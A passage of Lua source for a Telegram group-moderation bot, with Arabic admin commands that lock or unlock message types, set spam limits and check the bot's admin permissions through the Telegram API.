ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح التعديل")  
DevJoker:del(BlAcK..'Joker:Lock:EditMsgs'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙التعديل بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if JokerConstructor(msg) then
if UnLockText[2] == "التعديل الميديا" or UnLockText[2] == "تعديل الميديا" then
if DevJoker:get(BlAcK..'Joker:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح تعديل الميديا")  
DevJoker:del(BlAcK..'Joker:Lock:EditMsgs'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تعديل الميديا بالفعل مفتوح في المجموعه', 1, 'md')
end
end
end
if UnLockText[2] == "الفارسيه" then
if DevJoker:get(BlAcK..'Joker:Lock:Farsi'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الفارسيه")  
DevJoker:del(BlAcK..'Joker:Lock:Farsi'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الفارسيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الفشار" then
if not DevJoker:get(BlAcK..'Joker:Lock:Fshar'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الفشار")  
DevJoker:set(BlAcK..'Joker:Lock:Fshar'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الفشار بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الطائفيه" then
if not DevJoker:get(BlAcK..'Joker:Lock:Taf'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الطائفيه")  
DevJoker:set(BlAcK..'Joker:Lock:Taf'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الطائفيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الكفر" then
if not DevJoker:get(BlAcK..'Joker:Lock:Kfr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الكفر")  
DevJoker:set(BlAcK..'Joker:Lock:Kfr'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الكفر بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الفارسيه بالطرد" then
if DevJoker:get(BlAcK..'Joker:Lock:FarsiBan'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الفارسيه بالطرد")  
DevJoker:del(BlAcK..'Joker:Lock:FarsiBan'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الفارسيه بالطرد بالفعل مفتوحه', 1, 'md')
end
end
if JokerConstructor(msg) then
if UnLockText[2] == "البوتات" or UnLockText[2] == "البوتات بالطرد" or UnLockText[2] == "البوتات بالتقييد" or UnLockText[2] == "البوتات بالتقيد" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح البوتات")  
DevJoker:del(BlAcK.."Joker:Lock:Bots"..msg.chat_id_)  
end end
if UnLockText[2] == "التكرار" then 
DevJoker:hdel(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح التكرار")  
end
if BasicConstructor(msg) then
if UnLockText[2] == "التثبيت" then
if DevJoker:get(BlAcK..'Joker:Lock:Pin'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح التثبيت")  
DevJoker:del(BlAcK..'Joker:Lock:Pin'..msg.chat_id_)
DevJoker:srem(BlAcK.."Joker:Lock:Pinpin",msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙التثبيت بالفعل مفتوح في المجموعه', 1, 'md')
end end end
end
end
--     Source BlAcK     --
if Admin(msg) then
if text and text:match("^قفل (.*)$") and ChCheck(msg) then
local LockText = {string.match(text, "^(قفل) (.*)$")}
if LockText[2] == "الدردشه" then
if not DevJoker:get(BlAcK..'Joker:Lock:Text'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الدردشه")  
DevJoker:set(BlAcK..'Joker:Lock:Text'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الدردشه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاونلاين" then
if not DevJoker:get(BlAcK..'Joker:Lock:Inline'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الاونلاين")  
DevJoker:set(BlAcK..'Joker:Lock:Inline'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الاونلاين بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الصور" then
if not DevJoker:get(BlAcK..'Joker:Lock:Photo'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الصور")  
DevJoker:set(BlAcK..'Joker:Lock:Photo'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الصور بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الكلايش" then
if not DevJoker:get(BlAcK..'Joker:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الكلايش")  
DevJoker:set(BlAcK..'Joker:Lock:Spam'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الكلايش بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الدخول" then
if not DevJoker:get(BlAcK..'Joker:Lock:Join'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الدخول")  
DevJoker:set(BlAcK..'Joker:Lock:Join'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الدخول بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفيديو" then
if not DevJoker:get(BlAcK..'Joker:Lock:Videos'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الفيديو")  
DevJoker:set(BlAcK..'Joker:Lock:Videos'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الفيديو بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "المتحركه" then
if not DevJoker:get(BlAcK..'Joker:Lock:Gifs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل المتحركه")  
DevJoker:set(BlAcK..'Joker:Lock:Gifs'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙المتحركه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاغاني" then
if not DevJoker:get(BlAcK..'Joker:Lock:Music'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الاغاني")  
DevJoker:set(BlAcK..'Joker:Lock:Music'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الاغاني بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الصوت" then
if not DevJoker:get(BlAcK..'Joker:Lock:Voice'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الصوت")  
DevJoker:set(BlAcK..'Joker:Lock:Voice'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الصوت بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الروابط" then
if not DevJoker:get(BlAcK..'Joker:Lock:Links'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الروابط")  
DevJoker:set(BlAcK..'Joker:Lock:Links'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الروابط بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "المواقع" then
if not DevJoker:get(BlAcK..'Joker:Lock:Location'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل المواقع")  
DevJoker:set(BlAcK..'Joker:Lock:Location'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙المواقع بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "المعرف" or LockText[2] == "المعرفات" then
if not DevJoker:get(BlAcK..'Joker:Lock:Tags'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل المعرفات")  
DevJoker:set(BlAcK..'Joker:Lock:Tags'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙المعرفات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الملفات" then
if not DevJoker:get(BlAcK..'Joker:Lock:Document'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الملفات")  
DevJoker:set(BlAcK..'Joker:Lock:Document'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الملفات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الهاشتاك" or LockText[2] == "التاك" then
if not DevJoker:get(BlAcK..'Joker:Lock:Hashtak'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الهاشتاك")  
DevJoker:set(BlAcK..'Joker:Lock:Hashtak'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الهاشتاك بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الجهات" then
if not DevJoker:get(BlAcK..'Joker:Lock:Contact'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الجهات")  
DevJoker:set(BlAcK..'Joker:Lock:Contact'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '️᥀︙الجهات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الشبكات" then
if not DevJoker:get(BlAcK..'Joker:Lock:WebLinks'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الشبكات")  
DevJoker:set(BlAcK..'Joker:Lock:WebLinks'..msg.chat_id_,true) 
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الشبكات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "العربيه" then
if not DevJoker:get(BlAcK..'Joker:Lock:Arabic'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل العربيه")  
DevJoker:set(BlAcK..'Joker:Lock:Arabic'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙العربيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الانكليزيه" then
if not DevJoker:get(BlAcK..'Joker:Lock:English'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الانكليزيه")  
DevJoker:set(BlAcK..'Joker:Lock:English'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الانكليزيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الملصقات" then
if not DevJoker:get(BlAcK..'Joker:Lock:Stickers'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الملصقات")  
DevJoker:set(BlAcK..'Joker:Lock:Stickers'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الملصقات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الماركداون" then
if not DevJoker:get(BlAcK..'Joker:Lock:Markdown'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الماركداون")  
DevJoker:set(BlAcK..'Joker:Lock:Markdown'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الماركداون بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاشعارات" then
if not DevJoker:get(BlAcK..'Joker:Lock:TagServr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الاشعارات")  
DevJoker:set(BlAcK..'Joker:Lock:TagServr'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الاشعارات بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "التوجيه" then
if not DevJoker:get(BlAcK..'Joker:Lock:Forwards'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التوجيه")  
DevJoker:set(BlAcK..'Joker:Lock:Forwards'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙التوجيه بالفعل مقفل في المجموعه', 1, 'md')
end
end
end
end
--     Source BlAcK     --
if Admin(msg) then
if text and text:match("^فتح (.*)$") and ChCheck(msg) then
local UnLockText = {string.match(text, "^(فتح) (.*)$")}
if UnLockText[2] == "الدردشه" then
if DevJoker:get(BlAcK..'Joker:Lock:Text'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الدردشه")  
DevJoker:del(BlAcK..'Joker:Lock:Text'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الدردشه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الصور" then
if DevJoker:get(BlAcK..'Joker:Lock:Photo'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الصور")  
DevJoker:del(BlAcK..'Joker:Lock:Photo'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الصور بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الكلايش" then
if DevJoker:get(BlAcK..'Joker:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الكلايش")  
DevJoker:del(BlAcK..'Joker:Lock:Spam'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الكلايش بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الدخول" then
if DevJoker:get(BlAcK..'Joker:Lock:Join'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الدخول")  
DevJoker:del(BlAcK..'Joker:Lock:Join'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الدخول بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الفيديو" then
if DevJoker:get(BlAcK..'Joker:Lock:Videos'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الفيديو")  
DevJoker:del(BlAcK..'Joker:Lock:Videos'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الفيديو بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الملفات" then
if DevJoker:get(BlAcK..'Joker:Lock:Document'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الملفات")  
DevJoker:del(BlAcK..'Joker:Lock:Document'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الملفات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاونلاين" then
if DevJoker:get(BlAcK..'Joker:Lock:Inline'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الاونلاين")  
DevJoker:del(BlAcK..'Joker:Lock:Inline'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الاونلاين بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الماركداون" then
if DevJoker:get(BlAcK..'Joker:Lock:Markdown'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الماركداون")  
DevJoker:del(BlAcK..'Joker:Lock:Markdown'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الماركداون بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المتحركه" then
if DevJoker:get(BlAcK..'Joker:Lock:Gifs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح المتحركه")  
DevJoker:del(BlAcK..'Joker:Lock:Gifs'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙المتحركه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاغاني" then
if DevJoker:get(BlAcK..'Joker:Lock:Music'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الاغاني")  
DevJoker:del(BlAcK..'Joker:Lock:Music'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الاغاني بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الصوت" then
if DevJoker:get(BlAcK..'Joker:Lock:Voice'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الصوت")  
DevJoker:del(BlAcK..'Joker:Lock:Voice'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الصوت بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الروابط" then
if DevJoker:get(BlAcK..'Joker:Lock:Links'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الروابط")  
DevJoker:del(BlAcK..'Joker:Lock:Links'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الروابط بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المواقع" then
if DevJoker:get(BlAcK..'Joker:Lock:Location'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح المواقع")  
DevJoker:del(BlAcK..'Joker:Lock:Location'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙المواقع بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "المعرف" or UnLockText[2] == "المعرفات" then
if DevJoker:get(BlAcK..'Joker:Lock:Tags'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح المعرفات")  
DevJoker:del(BlAcK..'Joker:Lock:Tags'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙المعرفات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الهاشتاك" or UnLockText[2] == "التاك" then
if DevJoker:get(BlAcK..'Joker:Lock:Hashtak'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الهاشتاك")  
DevJoker:del(BlAcK..'Joker:Lock:Hashtak'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الهاشتاك بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الجهات" then
if DevJoker:get(BlAcK..'Joker:Lock:Contact'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الجهات")  
DevJoker:del(BlAcK..'Joker:Lock:Contact'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الجهات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الشبكات" then
if DevJoker:get(BlAcK..'Joker:Lock:WebLinks'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الشبكات")  
DevJoker:del(BlAcK..'Joker:Lock:WebLinks'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الشبكات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "العربيه" then
if DevJoker:get(BlAcK..'Joker:Lock:Arabic'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح العربيه")  
DevJoker:del(BlAcK..'Joker:Lock:Arabic'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙العربيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الانكليزيه" then
if DevJoker:get(BlAcK..'Joker:Lock:English'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الانكليزيه")  
DevJoker:del(BlAcK..'Joker:Lock:English'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الانكليزيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الاشعارات" then
if DevJoker:get(BlAcK..'Joker:Lock:TagServr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الاشعارات")  
DevJoker:del(BlAcK..'Joker:Lock:TagServr'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الاشعارات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الملصقات" then
if DevJoker:get(BlAcK..'Joker:Lock:Stickers'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الملصقات")  
DevJoker:del(BlAcK..'Joker:Lock:Stickers'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الملصقات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "التوجيه" then
if DevJoker:get(BlAcK..'Joker:Lock:Forwards'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح التوجيه")  
DevJoker:del(BlAcK..'Joker:Lock:Forwards'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙التوجيه بالفعل مفتوح في المجموعه', 1, 'md')
end
end
end
end
--     Source BlAcK     --
if text and text:match("^قفل التفليش$") or text and text:match("^تفعيل الحمايه القصوى$") and ChCheck(msg) then
if not Constructor(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمنشئين فقط', 1, 'md')
else
DevJoker:set(BlAcK.."Joker:Lock:Bots"..msg.chat_id_,"del") DevJoker:hset(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'Joker:Lock:Links','Joker:Lock:Contact','Joker:Lock:Forwards','Joker:Lock:Videos','Joker:Lock:Gifs','Joker:Lock:EditMsgs','Joker:Lock:Stickers','Joker:Lock:Farsi','Joker:Lock:Spam','Joker:Lock:WebLinks','Joker:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevJoker:set(BlAcK..Lock..msg.chat_id_,true)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التفليش")  
end
end
if text and text:match("^فتح التفليش$") and ChCheck(msg) then
if not Constructor(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمنشئين فقط', 1, 'md')
else
DevJoker:hdel(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
UnLockList ={'Joker:Lock:Links','Joker:Lock:Contact','Joker:Lock:Forwards','Joker:Lock:Videos','Joker:Lock:Gifs','Joker:Lock:EditMsgs','Joker:Lock:Stickers','Joker:Lock:Farsi','Joker:Lock:Spam','Joker:Lock:WebLinks','Joker:Lock:Photo'}
for i,UnLock in pairs(UnLockList) do
DevJoker:del(BlAcK..UnLock..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح التفليش")  
end
end
--     Source BlAcK     --
if text and text:match("^قفل الكل$") and ChCheck(msg) then
if not Constructor(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمنشئين فقط', 1, 'md')
else
DevJoker:del(BlAcK..'Joker:Lock:Fshar'..msg.chat_id_) DevJoker:del(BlAcK..'Joker:Lock:Taf'..msg.chat_id_) DevJoker:del(BlAcK..'Joker:Lock:Kfr'..msg.chat_id_) 
DevJoker:set(BlAcK.."Joker:Lock:Bots"..msg.chat_id_,"del") DevJoker:hset(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'Joker:Lock:EditMsgs','Joker:Lock:Farsi','Joker:Lock:TagServr','Joker:Lock:Inline','Joker:Lock:Photo','Joker:Lock:Spam','Joker:Lock:Videos','Joker:Lock:Gifs','Joker:Lock:Music','Joker:Lock:Voice','Joker:Lock:Links','Joker:Lock:Location','Joker:Lock:Tags','Joker:Lock:Stickers','Joker:Lock:Markdown','Joker:Lock:Forwards','Joker:Lock:Document','Joker:Lock:Contact','Joker:Lock:Hashtak','Joker:Lock:WebLinks'}
for i,Lock in pairs(LockList) do
DevJoker:set(BlAcK..Lock..msg.chat_id_,true)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل جميع الاوامر")  
end
end
if text and text:match("^فتح الكل$") and ChCheck(msg) then
if not Constructor(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمنشئين فقط', 1, 'md')
else
DevJoker:set(BlAcK..'Joker:Lock:Fshar'..msg.chat_id_,true) DevJoker:set(BlAcK..'Joker:Lock:Taf'..msg.chat_id_,true) DevJoker:set(BlAcK..'Joker:Lock:Kfr'..msg.chat_id_,true) DevJoker:hdel(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
UnLockList ={'Joker:Lock:EditMsgs','Joker:Lock:Text','Joker:Lock:Arabic','Joker:Lock:English','Joker:Lock:Join','Joker:Lock:Bots','Joker:Lock:Farsi','Joker:Lock:FarsiBan','Joker:Lock:TagServr','Joker:Lock:Inline','Joker:Lock:Photo','Joker:Lock:Spam','Joker:Lock:Videos','Joker:Lock:Gifs','Joker:Lock:Music','Joker:Lock:Voice','Joker:Lock:Links','Joker:Lock:Location','Joker:Lock:Tags','Joker:Lock:Stickers','Joker:Lock:Markdown','Joker:Lock:Forwards','Joker:Lock:Document','Joker:Lock:Contact','Joker:Lock:Hashtak','Joker:Lock:WebLinks'}
for i,UnLock in pairs(UnLockList) do
DevJoker:del(BlAcK..UnLock..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح جميع الاوامر")  
end
end
--     Source BlAcK     --
if Admin(msg) then
if text and (text:match("^ضع سبام (%d+)$") or text:match("^وضع سبام (%d+)$")) then
local SetSpam = text:match("ضع سبام (%d+)$") or text:match("وضع سبام (%d+)$")
if tonumber(SetSpam) < 40 then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙اختر عدد اكبر من 40 حرف ', 1, 'md')
else
DevJoker:set(BlAcK..'Joker:Spam:Text'..msg.chat_id_,SetSpam)
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم وضع عدد السبام ↫'..SetSpam, 1, 'md')
end
end
end
--     Source BlAcK     --
if Manager(msg) then
if text == "فحص" and ChCheck(msg) or text == "فحص البوت" and ChCheck(msg) then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..BlAcK)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.can_change_info == true then EDT = '✔️' else EDT = '✖️' end
if GetInfo.result.can_delete_messages == true then DEL = '✔️' else DEL = '✖️' end
if GetInfo.result.can_invite_users == true then INV = '✔️' else INV = '✖️' end
if GetInfo.result.can_pin_messages == true then PIN = '✔️' else PIN = '✖️' end
if GetInfo.result.can_restrict_members == true then BAN = '✔️' else BAN = '✖️' end
if GetInfo.result.can_promote_members == true then VIP = '✔️' else VIP = '✖️' end 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙صلاحيات البوت هي ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙حذف الرسائل ↫ '..DEL..'\n᥀︙دعوة المستخدمين ↫ '..INV..'\n᥀︙حظر المستخدمين ↫ '..BAN..'\n᥀︙تثبيت الرسائل ↫ '..PIN..'\n᥀︙تغيير المعلومات ↫ '..EDT..'\n᥀︙اضافة مشرفين ↫ '..VIP..'\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉', 1, 'md')
end end
if text and text:match("^تغير رد المطور (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد المطور (.*)$") 
